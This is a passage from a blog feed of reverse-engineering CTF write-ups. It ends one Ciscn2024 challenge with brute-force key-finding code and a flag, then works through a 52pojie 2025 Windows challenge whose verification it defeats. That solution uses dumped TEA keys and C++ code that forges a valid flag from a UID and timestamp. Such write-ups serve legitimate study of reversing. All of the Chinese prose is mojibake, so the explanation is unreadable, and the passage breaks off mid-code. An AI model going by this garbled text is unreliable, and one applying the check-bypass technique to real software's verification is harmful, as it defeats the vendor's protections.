class="line">&#123;</span><br><span class="line">Enc[j] = pParam1[j % <span class="number">2</span>] ^ KeyList[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> calc_value = <span class="built_in">calc</span>(Enc, <span class="number">48</span>);</span><br><span class="line"><span class="keyword">if</span> (calc_value == <span class="number">0xF703DF16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Cracked:%02X%02X\n&quot;</span>, pParam1[<span class="number">0</span>], pParam1[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºâ€Cracked:79BCâ€ï¼Œå¾—åˆ°å¯†é’¥ä¸º<strong>79BC</strong>ã€‚</p><h2 id="è·å–Flag"><a href="#è·å–Flag" class="headerlink" title="è·å–Flag"></a>è·å–Flag</h2><p>è¾“å…¥å¯†é’¥å’Œä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹IDï¼Œå†æ¬¡è¿›è¡Œè°ƒè¯•ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/32.png" alt="alt text"></p><p>å‘ç°å¯ä»¥æ­£å¸¸èµ°åˆ°decrypt_flagå‡½æ•°è°ƒç”¨å¤„ã€‚</p><p><img src="/2025/02/20/Ciscn-reverse-vt/33.png" alt="alt text"></p><p>å•æ­¥æ‰§è¡Œå®Œdecrypt_flagå‡½æ•°ï¼Œè·³è½¬åˆ°flagæŒ‡é’ˆå¤„ï¼Œå³å¯çœ‹åˆ°è§£å¯†åçš„flagã€‚</p><p><strong>flag{MjExNTY3MzE3NTQzMjI&#x3D;}</strong></p><p><img src="/2025/02/20/Ciscn-reverse-vt/34.png" alt="alt text"></p><h2 id="å¿ƒå¾—"><a href="#å¿ƒå¾—" class="headerlink" title="å¿ƒå¾—"></a>å¿ƒå¾—</h2><p>è¿™æ¬¡å…¨æµç¨‹åšä¸‹æ¥æ„Ÿè§‰å…¶å®é¢å¯¹å¤æ‚çš„æ··æ·†å’ŒèŠ±æŒ‡ä»¤å¾—æœ‰è€å¿ƒå»åˆ†æï¼Œè€å¿ƒçš„åŠ¨è°ƒè§‚å¯Ÿæ•°æ®å˜åŒ–ä»¥åŠæ³¨é‡Šå…³é”®ç‚¹ï¼Œè¿™æ ·æ‰èƒ½æ›´å¥½ç†é¡ºæ€è·¯å’Œç†è§£ä»£ç æµç¨‹ã€‚</p><p>è¿™æ¬¡èŠ±æŒ‡ä»¤å…¨éƒ½æ˜¯æ‰‹åŠ¨å»é™¤ï¼Œå› ä¸ºæ€•å†™è„šæœ¬å¤„ç†çš„èŠ±æŒ‡ä»¤ä¸å®Œæ•´ï¼Œä¹Ÿå°±æ˜¯æ‹…å¿ƒå»é™¤çš„ä¸å®Œæ•´å¯¼è‡´ç¨‹åºæ‰§è¡Œé”™ä¹±ã€‚ç°åœ¨å‘ç°å…¶å®æ˜¯å¯ä»¥å‚è€ƒå¼€æºçš„é‚£ä¸ªæ··æ·†é¡¹ç›®ï¼Œçœ‹ä»–ç”¨åˆ°äº†å“ªäº›èŠ±æŒ‡ä»¤ï¼Œç„¶åç»“åˆå®é™…æ±‡ç¼–è¿›è¡Œåˆ†æï¼Œåº”è¯¥æ˜¯å¯ä»¥å°†æ‰€æœ‰èŠ±æŒ‡ä»¤çš„æƒ…å†µéƒ½åˆ—å‡ºæ¥çš„ï¼Œç„¶åè¿›è¡Œä¸€é”®è„šæœ¬å»é™¤ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Ciscn2024-é€†å‘0è§£é¢˜-VT&quot;&gt;&lt;a href=&quot;#Ciscn2024-é€†å‘0è§£é¢˜-VT&quot; class=&quot;headerlink&quot; title=&quot;Ciscn2024-é€†å‘0è§£é¢˜-VT&quot;&gt;&lt;/a&gt;Ciscn2024-é€†å‘0è§£é¢˜-VT&lt;/h1&gt;&lt;h2 id=&quot;å‰</summary>
      
    
    
    
    <category term="CTFæ¯”èµ›" scheme="https://tkazer.github.io/categories/CTF%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>å¾çˆ±2025-Windowsé€†å‘é«˜çº§é¢˜-5</title>
    <link href="https://tkazer.github.io/2025/02/18/Wuai2025Windows5/"/>
    <id>https://tkazer.github.io/2025/02/18/Wuai2025Windows5/</id>
    <published>2025-02-18T09:32:48.000Z</published>
    <updated>2025-02-21T03:18:30.467Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å¾çˆ±2025-Windowsé€†å‘é«˜çº§é¢˜-5"><a href="#å¾çˆ±2025-Windowsé€†å‘é«˜çº§é¢˜-5" class="headerlink" title="å¾çˆ±2025-Windowsé€†å‘é«˜çº§é¢˜-5"></a>å¾çˆ±2025-Windowsé€†å‘é«˜çº§é¢˜-5</h1><p>è€ƒç‚¹ï¼šå¼‚æ­¥æ¶ˆæ¯æ‰§è¡Œï¼Œå˜ç§teaå±•å¼€ã€å˜ç§MD5ã€æ—¶é—´æˆ³ã€Flagåˆ†æ®µæ£€æŸ¥</p><h1 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h1><p>è¿™ä¸€æ®µæ˜¯è·å–ä¸¤ä¸ªç¼–è¾‘æ¡†çš„å†…å®¹ï¼Œå³uidå’Œflagï¼Œç„¶åflagè¦ç¬¦åˆå¼‚æˆ–çš„é‚£ä¸€ç³»åˆ—æ¡ä»¶ï¼Œå®é™…æ ¼å¼æ˜¯flag{â€¦}ã€‚</p><p><img src="/2025/02/18/Wuai2025Windows5/1.png" alt="alt text"></p><p>è·Ÿåˆ°è¿™è¾¹å‘ç°æœ‰ä¸€ç³»åˆ—å‡½æ•°ï¼Œmain_programé‡Œé¢çš„æ‰§è¡ŒéªŒè¯æŒ‰é’®åä¸»æµç¨‹ï¼Œexecuteæ˜¯main_programé‡Œé¢é€šè¿‡ä¸åŒæ¶ˆæ¯æ¥æ‰§è¡Œä¸åŒå‘½ä»¤çš„å‡½æ•°ã€‚ï¼ˆéƒ½æ˜¯è‡ªå‘½åçš„å‡½æ•°ï¼Œä»…ä»£è¡¨ä¸ªäººæƒ³æ³•ï¼‰</p><p><img src="/2025/02/18/Wuai2025Windows5/2.png" alt="alt text"></p><h2 id="executeå‡½æ•°"><a href="#executeå‡½æ•°" class="headerlink" title="executeå‡½æ•°"></a>executeå‡½æ•°</h2><p>å…¶ä»–æ¶ˆæ¯ï¼šå°†flagæ‹¬å·å†…æ•°æ®è¿›è¡Œunhexï¼ˆå¦‚1122å­—ç¬¦ä¸²ç›´æ¥è½¬æˆ0x11,0x22æ•°æ®ï¼‰</p><p>0x35æ¶ˆæ¯ï¼šè·å–å½“å‰åŠå°æ—¶æ•´ç‚¹æ—¶é—´æˆ³æ•°æ®ã€‚</p><p><img src="/2025/02/18/Wuai2025Windows5/3.png" alt="alt text"></p><p>0x55æ¶ˆæ¯ï¼šé€šè¿‡åˆ©ç”¨å˜ç§MD5+Saltå°†è§£å¯†å®Œæ•°æ®çš„å‰åå…­å­—èŠ‚è®¡ç®—å¾—åˆ°4å­—èŠ‚æ•°å€¼ã€‚</p><p><img src="/2025/02/18/Wuai2025Windows5/4.png" alt="alt text"></p><p>0x25æ¶ˆæ¯ï¼šunhexåæ•°æ®è¿›è¡Œè§£å¯†ï¼ˆDecryptå‡½æ•°ï¼‰ã€‚</p><p><img src="/2025/02/18/Wuai2025Windows5/5.png" alt="alt text"></p><h2 id="main-programå‡½æ•°"><a href="#main-programå‡½æ•°" class="headerlink" title="main_programå‡½æ•°"></a>main_programå‡½æ•°</h2><h3 id="ç¬¬ä¸€éƒ¨åˆ†"><a href="#ç¬¬ä¸€éƒ¨åˆ†" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ†"></a>ç¬¬ä¸€éƒ¨åˆ†</h3><p>è·å–flagæ‹¬å·å†…æ•°æ®é€šè¿‡æ¶ˆæ¯åˆ†å‘æ‰§è¡Œexecuteçš„unhexæ¶ˆæ¯ï¼Œç„¶åå†æ‰§è¡Œexecuteçš„Decryptå‡½æ•°ï¼Œè§£å¯†unhexåçš„æ•°æ®ï¼Œå°†è§£å¯†å®Œçš„æ•°æ®é•¿åº¦èµ‹å€¼ç»™v12ã€‚</p><p><img src="/2025/02/18/Wuai2025Windows5/6.png" alt="alt text"></p><h3 id="ç¬¬äºŒéƒ¨åˆ†"><a href="#ç¬¬äºŒéƒ¨åˆ†" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ†"></a>ç¬¬äºŒéƒ¨åˆ†</h3><p>å°†è§£å¯†å®Œæ•°æ®çš„å‰16å­—èŠ‚è¿›è¡Œcustom_MD5ï¼Œå¾—åˆ°4å­—èŠ‚æ•°æ®ï¼Œç„¶ååˆ¤æ–­è§£å¯†åæ•°æ®ç¬¬17ä¸ªå­—èŠ‚å¼€å§‹å››ä¸ªå­—èŠ‚æ˜¯å¦å’Œè®¡ç®—å¾—åˆ°çš„4å­—èŠ‚æ•°æ®ç›¸ç­‰ã€‚</p><p>å¦‚æœç›¸ç­‰å°±å†æ¬¡åˆ¤æ–­v12ï¼Œå³è§£å¯†åæ•°æ®é•¿åº¦ï¼Œåˆ¤æ–­æ˜¯å¦ç­‰äº20ã€‚</p><p>å†è°ƒç”¨executeçš„æ—¶é—´æˆ³è·å–æ¶ˆæ¯ï¼Œå¾—åˆ°8å­—èŠ‚æ—¶é—´æˆ³æ•°æ®ã€‚</p><p>æœ€åå†æ£€æŸ¥è§£å¯†åæ•°æ®å‰8å­—èŠ‚æ˜¯å¦ç­‰äºæ—¶é—´æˆ³æ•°æ®ï¼Œä»¥åŠç¬¬ä¹ä¸ªå­—èŠ‚å¾€å8å­—èŠ‚æ˜¯å¦ç­‰äºç¼–è¾‘æ¡†è¾“å…¥çš„uidã€‚</p><h3 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>è¾“å…¥çš„flagå¾—æ˜¯è¢«å’ŒDecryptç›¸å¯¹äºçš„åŠ å¯†å‡½æ•°è¿›è¡ŒåŠ å¯†åçš„æ•°æ®ï¼ŒåŠ å¯†å‰æ ¼å¼ï¼š{åŠæ—¶æ•´ç‚¹æ—¶é—´æˆ³ï¼ˆ8å­—èŠ‚ï¼‰ï¼Œuidï¼ˆ8å­—èŠ‚ï¼‰ï¼ŒCustom_MD5ï¼ˆå‰é¢åå…­å­—èŠ‚ï¼‰ï¼ˆ4å­—èŠ‚ï¼‰ï¼Œ0x04å¡«å……ï¼ˆå››ä¸ªå­—èŠ‚ï¼‰}</p><p>æœ€åä¸€éƒ¨åˆ†å¡«å……ä¼šåœ¨ä¸‹é¢Decryptå‡½æ•°é‡Œé¢è¯´æ˜æ¥ç”±ã€‚</p><p><img src="/2025/02/18/Wuai2025Windows5/7.png" alt="alt text"></p><h2 id="Decryptå‡½æ•°ï¼ˆsub-7FF7FAC92C40ï¼‰"><a href="#Decryptå‡½æ•°ï¼ˆsub-7FF7FAC92C40ï¼‰" class="headerlink" title="Decryptå‡½æ•°ï¼ˆsub_7FF7FAC92C40ï¼‰"></a>Decryptå‡½æ•°ï¼ˆsub_7FF7FAC92C40ï¼‰</h2><p>è¦æ±‚unhexåæ•°æ®é•¿åº¦è¦æ˜¯8çš„å€æ•°ï¼Œä¸”åˆ©ç”¨ä¸€ç³»åˆ—è®¡ç®—å¾—åˆ°v12è¿™ä¸ªæ•°æ®ï¼Œå‚ä¸å†…éƒ¨è§£å¯†çš„Keyç”Ÿæˆï¼Œæœ€åè¿˜è¦æ±‚è§£å¯†å®Œçš„æ•°æ®ç¬¦åˆä¸€ç³»åˆ—æ¡ä»¶éªŒè¯ã€‚</p><p><img src="/2025/02/18/Wuai2025Windows5/8.png" alt="alt text"></p><h3 id="è§£å¯†åæ•°æ®æ¡ä»¶éªŒè¯"><a href="#è§£å¯†åæ•°æ®æ¡ä»¶éªŒè¯" class="headerlink" title="è§£å¯†åæ•°æ®æ¡ä»¶éªŒè¯"></a>è§£å¯†åæ•°æ®æ¡ä»¶éªŒè¯</h3><p>ä»è¿™éƒ¨åˆ†é€»è¾‘ä»£ç å¯ä»¥åˆ†æï¼Œä»–æ˜¯å°†æœ€åv8æŒ‡å‘æœ€åä¸€ä¸ªæ•°æ®ï¼Œç„¶åv9èµ‹å€¼æœ€åä¸€ä¸ªæ•°æ®ï¼Œç„¶åv8å¾ªç¯é€’å‡ï¼Œç›´åˆ°å½“å‰v8æŒ‡å‘v8å¼€å§‹å¾€å‰çš„ç¬¬v9ä¸ªæŒ‡é’ˆç»“æŸï¼Œç„¶åæœ€åè§£å¯†åæ•°æ®é•¿åº¦&#x3D;å½“å‰é•¿åº¦-v9ã€‚</p><p>å·²çŸ¥è§£å¯†åå‰é¢å·²ç»å ç”¨äº†20å­—èŠ‚ï¼ˆæ—¶é—´æˆ³+uid+md5ï¼‰ï¼Œåœ¨main_programä¹Ÿå·²çŸ¥è§£å¯†åæ•°æ®é•¿åº¦è¦ç­‰äº20ï¼Œæ‰€ä»¥å¯ä»¥çŸ¥é“è¿™è¾¹v9å¿…é¡»ç­‰äº4ï¼Œæ‰€ä»¥v8ç­‰äº4ï¼Œæœ€åè¿™è¾¹ä¸€å…±å ç”¨4ä¸ªå­—èŠ‚ï¼Œå³{4,4,4,4}ï¼Œè¿™æ ·ç»è¿‡è¿™è¾¹çš„éªŒè¯æœ€åçš„sizeæ‰ä¼šç­‰äº20ã€‚</p><p><img src="/2025/02/18/Wuai2025Windows5/9.png" alt="alt text"></p><h3 id="decå‡½æ•°"><a href="#decå‡½æ•°" class="headerlink" title="decå‡½æ•°"></a>decå‡½æ•°</h3><p>å°†unhexåæ•°æ®æŒ‰8å­—èŠ‚åˆ†å—è¿›è¡Œteaçš„è§£å¯†ï¼ŒteaåŠ å¯†çš„Keyç”±ä¸Šä¸€å±‚ä¼ å…¥çš„v12é€šè¿‡RC4å¾—åˆ°ï¼Œä¸”æ¯æ¬¡è§£å¯†Keyéƒ½ä¼šå˜åŒ–ï¼ˆå›ºå®šå˜åŒ–ï¼‰ï¼Œç›´æ¥åŠ¨è°ƒå°±å¯ä»¥æ‹¿åˆ°å‡ æ¬¡è§£å¯†ç”¨åˆ°çš„Keyå€¼ã€‚</p><p><img src="/2025/02/18/Wuai2025Windows5/10.png" alt="alt text"></p><p>ä¸‹é¢ä¸€ç³»åˆ—è§£å¯†å°±æ˜¯teaçš„è§£å¯†ï¼Œä¸è¿‡æ˜¯å±•å¼€ï¼Œå¯ä»¥æ•°å‡ºä¸€å…±æ˜¯12è½®ï¼Œä¸”Deltaç›´æ¥å¯ä»¥é€šè¿‡ä¸¤æ¬¡sumçš„å€¼ç›¸å‡å¾—åˆ°ï¼ˆç”±äºteaè§£å¯†è¿™è¾¹åº”è¯¥æ˜¯åŠ ä¸Šsumï¼Œidaä¼ªä»£ç å±•ç¤ºæ˜¯å‡ï¼Œä½†æ˜¯å®é™…è®¡ç®—åæ•°å€¼ä¸€æ ·ï¼‰ï¼ŒB979379Eå°±æ˜¯teaè§£å¯†ç”¨åˆ°çš„Deltaã€‚</p><p><img src="/2025/02/18/Wuai2025Windows5/11.png" alt="alt text"></p><p>æ‰€ä»¥å°±å¯ä»¥é€šè¿‡åŠ¨è°ƒå¾—åˆ°çš„å‡ æ¬¡Keyå’ŒDeltaå†™å‡ºteaçš„åŠ å¯†ä»£ç ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> key1[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0xD7851B65</span>,</span><br><span class="line">    <span class="number">0x473457C1</span>,</span><br><span class="line">    <span class="number">0x1231F787</span>,</span><br><span class="line">    <span class="number">0x9ACD6D9A</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint32_t</span> key2[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0xB728E994</span>,</span><br><span class="line">    <span class="number">0x1746382E</span>,</span><br><span class="line">    <span class="number">0xC52D865C</span>,</span><br><span class="line">    <span class="number">0x10778A6E</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint32_t</span> key3[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x7459F437</span>,</span><br><span class="line">    <span class="number">0x90D1E5D</span>,</span><br><span class="line">    <span class="number">0x779375B2</span>,</span><br><span class="line">    <span class="number">0xEFCB8541</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_encrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xB979379E</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¸»è§£é¢˜æµç¨‹"><a href="#ä¸»è§£é¢˜æµç¨‹" class="headerlink" title="ä¸»è§£é¢˜æµç¨‹"></a>ä¸»è§£é¢˜æµç¨‹</h2><p>é€šè¿‡ç”¨c++å®ç°è¿™éƒ¨åˆ†ä»£ç ï¼Œè·å–æ—¶é—´æˆ³æ•°æ®ï¼ˆ8å­—èŠ‚ï¼‰ã€‚</p><p><img src="/2025/02/18/Wuai2025Windows5/12.png" alt="alt text"></p><p>ç„¶åå°†uidè½¬ä¸º8å­—èŠ‚å­—èŠ‚æ•°æ®æ‹¼æ¥åˆ°æ—¶é—´æˆ³å­—èŠ‚åé¢ã€‚</p><p>MD5å€¼æš‚æ—¶å¡«å……4ä¸ª0x00ï¼Œå°†MD5å€¼å’Œ4ä¸ª0x04å­—èŠ‚æ‹¼æ¥ä¸Šã€‚</p><p>å°†å®Œæ•´æ•°æ®è¿›è¡Œtea_encryptï¼Œå†ç”¨flag{}åŒ…è£¹å¡«å…¥ç¼–è¾‘æ¡†è¿›è¡ŒéªŒè¯ã€‚</p><p>åœ¨MD5ç”Ÿæˆä»£ç å¤„ï¼Œæ–­ç‚¹åœ¨ç®­å¤´å¤„ï¼Œå³å¯å¾—åˆ°MD5å››å­—èŠ‚æ•°æ®ã€‚</p><p><img src="/2025/02/18/Wuai2025Windows5/13.png" alt="alt text"></p><p>æœ€ç»ˆå†é‡å¤ä¸Šé¢æ­¥éª¤å³å¯å¾—åˆ°flagã€‚</p><h1 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_encrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xB979379E</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">è¾“å…¥æ ¼å¼ï¼š</span></span><br><span class="line"><span class="comment">flag</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">tea_enc</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    timestamp 8å­—èŠ‚</span></span><br><span class="line"><span class="comment">    uid 8å­—èŠ‚</span></span><br><span class="line"><span class="comment">    md5 4å­—èŠ‚</span></span><br><span class="line"><span class="comment">    0x04*4 4å­—èŠ‚å¡«å……</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// åŠ¨è°ƒå¾—åˆ°çš„ä¸‰ä¸ªKey</span></span><br><span class="line">    <span class="type">uint32_t</span> key1[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xD7851B65</span>,</span><br><span class="line">        <span class="number">0x473457C1</span>,</span><br><span class="line">        <span class="number">0x1231F787</span>,</span><br><span class="line">        <span class="number">0x9ACD6D9A</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key2[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xB728E994</span>,</span><br><span class="line">        <span class="number">0x1746382E</span>,</span><br><span class="line">        <span class="number">0xC52D865C</span>,</span><br><span class="line">        <span class="number">0x10778A6E</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key3[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x7459F437</span>,</span><br><span class="line">        <span class="number">0x90D1E5D</span>,</span><br><span class="line">        <span class="number">0x779375B2</span>,</span><br><span class="line">        <span class="number">0xEFCB8541</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> timestamp_bytes[<span class="number">8</span>]&#123;&#125;;</span><br><span class="line">    <span class="comment">// 8å­—èŠ‚ä¸‹çš„UID</span></span><br><span class="line">    <span class="type">uint8_t</span> uid[]&#123; <span class="number">0x50</span>, <span class="number">0x04</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">    <span class="comment">// åŠ¨è°ƒå¾—åˆ°MD5å››ä¸ªå­—èŠ‚ï¼ŒåŠ ä¸Šæœ€å4ä¸ª0x04å¡«å……</span></span><br><span class="line">    <span class="type">uint8_t</span> md5_and_pad[]&#123; <span class="number">0xD2</span>, <span class="number">0x63</span>, <span class="number">0xE4</span>, <span class="number">0xE6</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x04</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŠæ—¶æ•´ç‚¹æ—¶é—´æˆ³è®¡ç®—</span></span><br><span class="line">    FILETIME time&#123;&#125;;</span><br><span class="line">    DWORD64 timestamp&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetSystemTimeAsFileTime</span>(&amp;time);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)(&amp;timestamp), (<span class="type">void</span>*)(&amp;time), <span class="number">8</span>);</span><br><span class="line">    timestamp = <span class="number">1800</span> * ((timestamp / <span class="number">0x989680</span> - <span class="number">0x2B6109100LL</span>) / <span class="number">0x708</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)(timestamp_bytes), (<span class="type">void</span>*)(&amp;timestamp), <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŠ å¯†æ•°æ®</span></span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)timestamp_bytes, (<span class="type">uint32_t</span>*)key1);</span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)uid, (<span class="type">uint32_t</span>*)key2);</span><br><span class="line">    <span class="built_in">tea_encrypt</span>((<span class="type">uint32_t</span>*)md5_and_pad, (<span class="type">uint32_t</span>*)key3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, timestamp_bytes[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, uid[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; 